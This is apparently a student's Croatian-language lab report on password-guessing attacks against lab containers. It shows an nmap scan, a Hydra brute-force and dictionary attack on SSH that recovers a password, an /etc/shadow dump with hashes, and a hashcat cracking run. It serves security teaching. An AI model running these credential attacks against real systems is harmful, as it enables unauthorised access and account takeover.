# Sigurnost Računala i Podataka

# 5**. Laboratorijska vježba**

### ***Online and Offline Password Guessing Attacks***

**Cilj vježbe je online/offline password guessing napadom doznati šifru pripadnog kontejnera na lokalnom serveru.**

**Najprije se provjerava konekcija računala sa serverom**

```bash
ping a507-server.local
```

**Nakon što se potvrdila konekcija, potrebno je skenirati određeni raspon adresa mreže. Za to se koristi nmap**

*nmap je skraćenica za Network Mapper. nmap je open-source tool za skeniranje IP adresa i portova na mreži.*

**Za instalaciju u *bash shell* se koriste sljedeće naredbe**

```bash
sudo apt-get update
sudo apt-get install nmap
```

**Koristeći sljedeću naredbu skeniramo raspon adresa, odnosno 16 adresa što se može vidjeti iz maske  $2^4$**

```bash
nmap -v 10.0.15.0/28
```

- **Te se dobije sljedeći ispis:**
    
    ```
    Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-04 11:15 CET
    Initiating Ping Scan at 11:15
    Scanning 16 hosts [2 ports/host]
    Completed Ping Scan at 11:15, 1.20s elapsed (16 total hosts)
    Initiating Parallel DNS resolution of 16 hosts. at 11:15
    Completed Parallel DNS resolution of 16 hosts. at 11:16, 14.03s elapsed
    Nmap scan report for 10.0.15.12 [host down]
    Nmap scan report for 10.0.15.13 [host down]
    Nmap scan report for 10.0.15.14 [host down]
    Nmap scan report for 10.0.15.15 [host down]
    Initiating Connect Scan at 11:16
    Scanning 12 hosts [1000 ports/host]
    Discovered open port 22/tcp on 10.0.15.2
    Discovered open port 22/tcp on 10.0.15.1
    Discovered open port 22/tcp on 10.0.15.5
    Discovered open port 22/tcp on 10.0.15.8
    Discovered open port 22/tcp on 10.0.15.4
    Discovered open port 22/tcp on 10.0.15.6
    Discovered open port 22/tcp on 10.0.15.7
    Discovered open port 22/tcp on 10.0.15.3
    Discovered open port 22/tcp on 10.0.15.9
    Discovered open port 22/tcp on 10.0.15.0
    Discovered open port 22/tcp on 10.0.15.10
    Discovered open port 22/tcp on 10.0.15.11
    Completed Connect Scan against 10.0.15.9 in 1.60s (11 hosts left)
    Completed Connect Scan against 10.0.15.2 in 1.62s (10 hosts left)
    Completed Connect Scan against 10.0.15.1 in 1.62s (9 hosts left)
    Completed Connect Scan against 10.0.15.8 in 1.62s (8 hosts left)
    Completed Connect Scan against 10.0.15.3 in 1.63s (7 hosts left)
    Completed Connect Scan against 10.0.15.4 in 1.63s (6 hosts left)
    Completed Connect Scan against 10.0.15.6 in 1.63s (5 hosts left)
    Completed Connect Scan against 10.0.15.11 in 1.66s (4 hosts left)
    Completed Connect Scan against 10.0.15.0 in 1.66s (3 hosts left)
    Completed Connect Scan against 10.0.15.5 in 1.71s (2 hosts left)
    Completed Connect Scan against 10.0.15.7 in 1.71s (1 host left)
    Completed Connect Scan at 11:16, 1.71s elapsed (12000 total ports)
    Nmap scan report for 10.0.15.0
    Host is up (0.00082s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    
    Nmap scan report for 10.0.15.1
    Host is up (0.0010s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    
    Nmap scan report for 10.0.15.2
    Host is up (0.0011s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    
    Nmap scan report for 10.0.15.3
    Host is up (0.00084s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    
    Nmap scan report for 10.0.15.4
    Host is up (0.00082s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    
    Nmap scan report for 10.0.15.5
    Host is up (0.0011s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    
    Nmap scan report for 10.0.15.6
    Host is up (0.00088s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    
    Nmap scan report for 10.0.15.7
    Host is up (0.00086s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    
    Nmap scan report for 10.0.15.8
    Host is up (0.0011s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    
    Nmap scan report for 10.0.15.9
    Host is up (0.0017s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    
    Nmap scan report for 10.0.15.10
    Host is up (0.00098s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    
    Nmap scan report for 10.0.15.11
    Host is up (0.0014s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    
    Read data files from: /usr/bin/../share/nmap
    Nmap done: 16 IP addresses (12 hosts up) scanned in 16.99 seconds
    ```
    

**Iz ispisa se vidi da postoji 12 računala na kojima postoje otvoreni portovi. To su IP adrese virtualnih kontejnera. Detektiran je port 22 koji koristi secure shell servis te koristi tcp protokol. To je važno jer ssh omogućuje sigurnu konekciju (siguran tunel)**

**Ukoliko pokušamo se spojiti preko command linije na kontejner preko ssh**

```bash
ssh stankovic_mateo@10.0.15.10
```

**Zahtjeva  upis lozinke**

stankovic_mateo@10.0.15.10's password:

**Znači postoji problem. Lozinka je nepoznata (s gledišta napadača). Sa strane sustava, ono će provjeravati lozinku koliko god primio zahtjeva sa iste IP adrese. To napadaču omogućuje online napad (dictionary password guessing). Može pokušat testirati različite lozinke koje su za danu osobu najvjerojatnije te pustiti da program automatski radi dok ne pogodi lozinku. Stoga, kad se podiže ssh servis, treba ograničiti broj pristupa jer je moguć napad ukoliko se uzastopno pokušava prijaviti s iste IP adrese.**

**Kod ove vježbe će se koristiti alat Hydra i pokušati će se napraviti dva napada.**

**Zna se sljedeće vezano za lozinku**

- **Sadržana su samo mala slova**
- **Sadrži 4 do 6 karaktera**

**Iz toga se može zaključiti da postoji $26^4 + 26^5 + 26^6$ lozinki što je približno $26^6$ ~ $2^{29}$ ~ milijarda.**

**Ukoliko pokušamo napad ispitivajući svih milijardu lozinki**

```bash
hydra -l stankovic_mateo -x 4:6:a 10.0.15.10 -V -t 1 ssh
```

- **Te se dobije sljedeći ispis:**
    
    ```
    Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
    
    Hydra (http://www.thc.org/thc-hydra) starting at 2022-01-04 11:37:32
    [DATA] max 1 task per 1 server, overall 1 task, 321254128 login tries (l:1/p:321254128), ~321254128 tries per task
    [DATA] attacking ssh://10.0.15.10:22/
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "aaaa" - 1 of 321254128 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "aaab" - 2 of 321254128 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "aaac" - 3 of 321254128 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "aaad" - 4 of 321254128 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "aaae" - 5 of 321254128 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "aaaf" - 6 of 321254128 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "aaag" - 7 of 321254128 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "aaah" - 8 of 321254128 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "aaai" - 9 of 321254128 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "aaaj" - 10 of 321254128 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "aaak" - 11 of 321254128 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "aaal" - 12 of 321254128 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "aaam" - 13 of 321254128 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "aaan" - 14 of 321254128 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "aaao" - 15 of 321254128 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "aaap" - 16 of 321254128 [child 0] (0/0)
    [STATUS] 16.00 tries/min, 16 tries in 00:01h, 321254112 to do in 334639:43h, 1 active
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "aaaq" - 17 of 321254128 [c
    #...
    ```
    

**Vidi se da ustvari postoji 321253128 ukupnih mogućih lozinki. Napad radi 16 test/min = $2^4$ test/min. T je približno $2^{28}/2^4$ = $2^{24}$ min što iznosi $2^5 = 32$ godine. Znači ovaj način napada je neučinkovit. Potrebno je ubrzati napad.**

**Alternativa je ubrzanje pomoću *dictiornary*. Nije idealno povećavati rate test jer se testira preko mreže što ovisii serveru - ne može se ubrzati server. Znači mora se imati nešto bolji *dictionary*.**

**Za ovu vježbu, d*ictionary* se može preuzeti sa servera**

```bash
wget -r -nH -np --reject "index.html*" http://a507-server.local:8080/dictionary/g5/
```

**U ovom slučaju imaju dva *dictionarya*. Jedan za online, drugi za offline napad.**

### Online napad

***Dictionary* će se iskorititi preko *hydre.***

```bash
hydra -l stankovic_mateo -P dictionary/g1/dictionary_online.txt 10.0.15.10 -V -t 4 ssh
```

- **Te se dobije sljedeći ispis:**
    
    ```
    Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
    
    Hydra (http://www.thc.org/thc-hydra) starting at 2022-01-04 11:48:39
    [ERROR] File for passwords not found: dictionary/g1/dictionary_online.txt
    student@DESKTOP-7Q0BASR:/mnt/c/Users/A507$ hydra -l stankovic_mateo -P dictionary/g5/dictionary_online.txt 10.0.15.10 -V
     -t 4 ssh
    Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
    
    Hydra (http://www.thc.org/thc-hydra) starting at 2022-01-04 11:48:55
    [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
    [DATA] max 4 tasks per 1 server, overall 4 tasks, 872 login tries (l:1/p:872), ~218 tries per task
    [DATA] attacking ssh://10.0.15.10:22/
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajnnj" - 1 of 872 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajgkl" - 2 of 872 [child 1] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajgzj" - 3 of 872 [child 2] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajeag" - 4 of 872 [child 3] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajlnk" - 5 of 872 [child 2] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajana" - 6 of 872 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajaat" - 7 of 872 [child 1] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajejk" - 8 of 872 [child 3] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajalz" - 9 of 872 [child 2] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "olents" - 10 of 872 [child 3] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajapj" - 11 of 872 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajpll" - 12 of 872 [child 1] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajpnk" - 13 of 872 [child 2] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "lthexp" - 14 of 872 [child 3] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajgpa" - 15 of 872 [child 1] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajeaz" - 16 of 872 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajekj" - 17 of 872 [child 2] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajgke" - 18 of 872 [child 3] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajllg" - 19 of 872 [child 1] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajpne" - 20 of 872 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajjzn" - 21 of 872 [child 2] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajtlp" - 22 of 872 [child 3] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajgzz" - 23 of 872 [child 1] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajgkn" - 24 of 872 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajnek" - 25 of 872 [child 2] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajnjn" - 26 of 872 [child 3] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajpej" - 27 of 872 [child 1] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajgkj" - 28 of 872 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajttl" - 29 of 872 [child 2] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajtgj" - 30 of 872 [child 3] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajnlz" - 31 of 872 [child 1] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajgaz" - 32 of 872 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "atsser" - 33 of 872 [child 2] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajakz" - 34 of 872 [child 3] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajakt" - 35 of 872 [child 1] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajtjz" - 36 of 872 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "cmisat" - 37 of 872 [child 2] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajlap" - 38 of 872 [child 3] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajnpj" - 39 of 872 [child 1] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "privai" - 40 of 872 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajljt" - 41 of 872 [child 2] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajtzt" - 42 of 872 [child 3] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajtlz" - 43 of 872 [child 1] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajjnn" - 44 of 872 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajtla" - 45 of 872 [child 2] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajgta" - 46 of 872 [child 3] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajtej" - 47 of 872 [child 1] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajlpk" - 48 of 872 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajejn" - 49 of 872 [child 2] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajate" - 50 of 872 [child 3] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajtkt" - 51 of 872 [child 1] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajeaj" - 52 of 872 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajegt" - 53 of 872 [child 2] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajapz" - 54 of 872 [child 3] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajgjl" - 55 of 872 [child 1] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "isatsi" - 56 of 872 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajgte" - 57 of 872 [child 2] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajnkp" - 58 of 872 [child 3] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajlja" - 59 of 872 [child 1] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajptt" - 60 of 872 [child 0] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajlpg" - 61 of 872 [child 2] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajtln" - 62 of 872 [child 3] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajjpn" - 63 of 872 [child 1] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajjka" - 64 of 872 [child 0] (0/0)
    [STATUS] 64.00 tries/min, 64 tries in 00:01h, 808 to do in 00:13h, 4 active
    #...
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajjet" - 187 of 872 [child 1] (0/0)
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "kajnln" - 188 of 872 [child 0] (0/0)
    [STATUS] 62.67 tries/min, 188 tries in 00:03h, 684 to do in 00:11h, 4 active
    [ATTEMPT] target 10.0.15.10 - login "stankovic_mateo" - pass "atratm" - 189 of 872 [child 2] (0/0)
    [22][ssh] host: 10.0.15.10   login: stankovic_mateo   password: atratm
    1 of 1 target successfully completed, 1 valid password found
    Hydra (http://www.thc.org/thc-hydra) finished at 2022-01-04 11:52:05
    ```
    

**Dobiven je password**

**atratm**

**Koristeći otkriveni password se uspiješno spaja na virtualni kontejner. Napad uspješan.**

### Offline napad

**Offline napad se može ostvariti ukoliko se zna hash vrijednost lozinke. U ovom slučaju kako je online napad uspiješan, mogu se preuzeti hash vrijednosti lozinke u mapi *shadow* (tražiti će lozinku koja je otkrivena: atratm)**

```bash
sudo cat /etc/shadow
```

- **Te se dobije sljedeći ispis:**
    
    ```
    [sudo] password for stankovic_mateo:
    root:*:18900:0:99999:7:::
    daemon:*:18900:0:99999:7:::
    bin:*:18900:0:99999:7:::
    sys:*:18900:0:99999:7:::
    sync:*:18900:0:99999:7:::
    games:*:18900:0:99999:7:::
    man:*:18900:0:99999:7:::
    lp:*:18900:0:99999:7:::
    mail:*:18900:0:99999:7:::
    news:*:18900:0:99999:7:::
    uucp:*:18900:0:99999:7:::
    proxy:*:18900:0:99999:7:::
    www-data:*:18900:0:99999:7:::
    backup:*:18900:0:99999:7:::
    list:*:18900:0:99999:7:::
    irc:*:18900:0:99999:7:::
    gnats:*:18900:0:99999:7:::
    nobody:*:18900:0:99999:7:::
    _apt:*:18900:0:99999:7:::
    systemd-network:*:18977:0:99999:7:::
    systemd-resolve:*:18977:0:99999:7:::
    messagebus:*:18977:0:99999:7:::
    sshd:*:18977:0:99999:7:::
    stankovic_mateo:$6$4sQHcs7iWHLbqQdt$dROEuFXeUdw2aGbAV1LUYRYR.o8XaeqovCxljB1WWHUiaujX5iiR.s0rRV7YH86oXgF/bNt8IykiSPOCpGJpP/:18996:0:99999:7:::
    jean_doe:$6$o5WKj6lq5FRVL1oS$ZfJYxGyClVvboyeW2CO8jXgSZfZSWhjUrFccw9KL45wf0X/pEpiuB/2nJE47jS0ljb38w.CUpZbNwUJBVSplJ0:18996:0:99999:7:::
    john_doe:$6$hWRvygjUQe/AJP3f$lSKWpaaqwU6y9DZKq359AOkpqI5mjwyJFU7sDHuM3YhpHVN8hfGYL4qSuQiJkdutrhzOh8ZWkGi1MfrxLa5rU1:18996:0:99999:7:::
    alice_cooper:$6$xWLo79aOAg1wRv5c$E4sgKZjoIWcV4UferOBfli14Nyaw4ICF5XYgh6Fio0huYDWBDEkUrs0mhlqG/KmOy9lphzn.bmFJI0g.oe2bz/:18996:0:99999:7:::
    john_deacon:$6$bfhSWLGCOMxQPcoD$VzcyprU/pP1khHB3PzNQo.6wcvv2LaCZvQDz4zk4q33JdxxQAV6NUJzyGy0gnk0pBFRFUfFnJ8YoOFPMdV8uq.:18996:0:99999:7:::
    freddie_mercury:$6$IBY.puhCUA3Kjbgo$8fuWt53J4GLzljw84cuCO7UwtqAVFwQm8ocy..4HqHH8ag2doCtSYc83oAgR8UW9sL/xv0OV54kbSn7xQZRoH.:18996:0:99999:7:::
    ```
    

**U ovom slučaju je za primjer uzet korisnik John_doe:**

$6$o5WKj6lq5FRVL1oS$ZfJYxGyClVvboyeW2CO8jXgSZfZSWhjUrFccw9KL45wf0X/pEpiuB/2nJE47jS0ljb38w.CUpZbNwUJBVSplJ0

**Za izvršenje offline napada će se koristiti  alat *hashcat***

*Instalacija:*

```bash
sudo apt-get install hashcat
```

*Napad:*

```bash
hashcat --force -m 1800 -a 3 hash.txt ?l?l?l?l?l?l --status --status-timer 1
```

- **Te se dobije sljedeći ispis:**
    
    ```
    hashcat (v4.0.1) starting...
    
    OpenCL Platform #1: The pocl project
    ====================================
    * Device #1: pthread-Intel(R) Core(TM) i7-7500U CPU @ 2.70GHz, 2048/7411 MB allocatable, 4MCU
    
    Hashes: 1 digests; 1 unique digests, 1 unique salts
    Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
    
    Applicable optimizers:
    * Zero-Byte
    * Single-Hash
    * Single-Salt
    * Brute-Force
    * Uses-64-Bit
    
    Password length minimum: 0
    Password length maximum: 256
    
    ATTENTION! Pure (unoptimized) OpenCL kernels selected.
    This enables cracking passwords and salts > length 32 but for the price of drastical reduced performance.
    If you want to switch to optimized OpenCL kernels, append -O to your commandline.
    
    Watchdog: Hardware monitoring interface not found on your system.
    Watchdog: Temperature abort trigger disabled.
    Watchdog: Temperature retain trigger disabled.
    
    * Device #1: build_opts '-I /usr/share/hashcat/OpenCL -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=4 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=16 -D KERN_TYPE=1800 -D _unroll'
    - Device #1: autotuned kernel-accel to 44
    - Device #1: autotuned kernel-loops to 46
    [s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit =>
    
    Session..........: hashcat
    Status...........: Running
    Hash.Type........: sha512crypt $6$, SHA512 (Unix)
    Hash.Target......: $6$o5WKj6lq5FRVL1oS$ZfJYxGyClVvboyeW2CO8jXgSZfZSWhj...VSplJ0
    Time.Started.....: Tue Jan  4 12:09:12 2022 (9 secs)
    Time.Estimated...: Thu Jan 20 03:50:18 2022 (15 days, 15 hours)
    Guess.Mask.......: ?l?l?l?l?l?l [6]
    Guess.Queue......: 1/1 (100.00%)
    Speed.Dev.#1.....:      228 H/s (6.75ms)
    Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts
    Progress.........: 2112/308915776 (0.00%)
    Rejected.........: 0/2112 (0.00%)
    Restore.Point....: 0/11881376 (0.00%)
    Candidates.#1....: harier -> hjurer
    HWMon.Dev.#1.....: N/A
    
    [s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit =>
    
     wget -r -nH -np --reject "index.html*" http://a507-server.local:8080/dictionary/g5/
    --2022-01-04 12:10:16--  http://a507-server.local:8080/dictionary/g5/
    Resolving a507-server.local (a507-server.local)... 10.0.1.172, fe80::aaa1:59ff:fe69:5278
    Connecting to a507-server.local (a507-server.local)|10.0.1.172|:8080... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: unspecified [text/html]
    Saving to: â€˜dictionary/g5/index.html.tmpâ€™
    
    dictionary/g5/index.html.tmp                    [ <=>                                                                                     ]   4.59K  --.-KB/s    in 0s
    
    2022-01-04 12:10:16 (218 MB/s) - â€˜dictionary/g5/index.html.tmpâ€™ saved [4700]
    
    Loading robots.txt; please ignore errors.
    --2022-01-04 12:10:16--  http://a507-server.local:8080/robots.txt
    Reusing existing connection to a507-server.local:8080.
    HTTP request sent, awaiting response... 404 Not Found
    2022-01-04 12:10:16 ERROR 404: Not Found.
    
    Removing dictionary/g5/index.html.tmp since it should be rejected.
    
    --2022-01-04 12:10:16--  http://a507-server.local:8080/dictionary/g5/dictionary_offline.txt
    Reusing existing connection to a507-server.local:8080.
    HTTP request sent, awaiting response... 200 OK
    Length: 350504 (342K) [text/plain]
    Saving to: â€˜dictionary/g5/dictionary_offline.txtâ€™
    
    dictionary/g5/dictionary_offline.txt        100%[========================================================================================>] 342.29K  --.-KB/s    in 0.03s
    
    2022-01-04 12:10:16 (12.4 MB/s) - â€˜dictionary/g5/dictionary_offline.txtâ€™ saved [350504/350504]
    
    --2022-01-04 12:10:16--  http://a507-server.local:8080/dictionary/g5/dictionary_online.txt
    Reusing existing connection to a507-server.local:8080.
    HTTP request sent, awaiting response... 200 OK
    Length: 6104 (6.0K) [text/plain]
    Saving to: â€˜dictionary/g5/dictionary_online.txtâ€™
    
    dictionary/g5/dictionary_online.txt         100%[========================================================================================>]   5.96K  --.-KB/s    in 0s
    
    2022-01-04 12:10:16 (236 MB/s) - â€˜dictionary/g5/dictionary_online.txtâ€™ saved [6104/6104]
    
    FINISHED --2022-01-04 12:10:16--
    Total wall clock time: 0.1s
    Downloaded: 3 files, 353K in 0.03s (12.8 MB/s)
    
    #Sad ide offline napad sa dict
    hashcat --force -m 1800 -a 0 hash.txt dictionary/g5/dictionary_offline.txt --status --status-timer 10
    hashcat (v4.0.1) starting...
    
    OpenCL Platform #1: The pocl project
    ====================================
    * Device #1: pthread-Intel(R) Core(TM) i7-7500U CPU @ 2.70GHz, 2048/7411 MB allocatable, 4MCU
    
    Hashes: 1 digests; 1 unique digests, 1 unique salts
    Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
    Rules: 1
    
    Applicable optimizers:
    * Zero-Byte
    * Single-Hash
    * Single-Salt
    * Uses-64-Bit
    
    Password length minimum: 0
    Password length maximum: 256
    
    ATTENTION! Pure (unoptimized) OpenCL kernels selected.
    This enables cracking passwords and salts > length 32 but for the price of drastical reduced performance.
    If you want to switch to optimized OpenCL kernels, append -O to your commandline.
    
    Watchdog: Hardware monitoring interface not found on your system.
    Watchdog: Temperature abort trigger disabled.
    Watchdog: Temperature retain trigger disabled.
    
    * Device #1: build_opts '-I /usr/share/hashcat/OpenCL -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=4 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=16 -D KERN_TYPE=1800 -D _unroll'
    Dictionary cache built:
    * Filename..: dictionary/g5/dictionary_offline.txt
    * Passwords.: 50072
    * Bytes.....: 350504
    * Keyspace..: 50072
    * Runtime...: 0 secs
    
    - Device #1: autotuned kernel-accel to 32
    - Device #1: autotuned kernel-loops to 64
    [s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit => [s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit =>
    
    Session..........: hashcat
    Status...........: Running
    Hash.Type........: sha512crypt $6$, SHA512 (Unix)
    Hash.Target......: $6$o5WKj6lq5FRVL1oS$ZfJYxGyClVvboyeW2CO8jXgSZfZSWhj...VSplJ0
    Time.Started.....: Tue Jan  4 12:11:04 2022 (10 secs)
    Time.Estimated...: Tue Jan  4 12:14:51 2022 (3 mins, 37 secs)
    Guess.Base.......: File (dictionary/g5/dictionary_offline.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.Dev.#1.....:      220 H/s (6.72ms)
    Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts
    Progress.........: 2176/50072 (4.35%)
    Rejected.........: 0/2176 (0.00%)
    Restore.Point....: 2176/50072 (4.35%)
    Candidates.#1....: kakegz -> kzppke
    HWMon.Dev.#1.....: N/A
    
    [s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit =>
    
    Session..........: hashcat
    Status...........: Running
    Hash.Type........: sha512crypt $6$, SHA512 (Unix)
    Hash.Target......: $6$o5WKj6lq5FRVL1oS$ZfJYxGyClVvboyeW2CO8jXgSZfZSWhj...VSplJ0
    Time.Started.....: Tue Jan  4 12:11:04 2022 (20 secs)
    Time.Estimated...: Tue Jan  4 12:14:40 2022 (3 mins, 16 secs)
    Guess.Base.......: File (dictionary/g5/dictionary_offline.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.Dev.#1.....:      231 H/s (6.71ms)
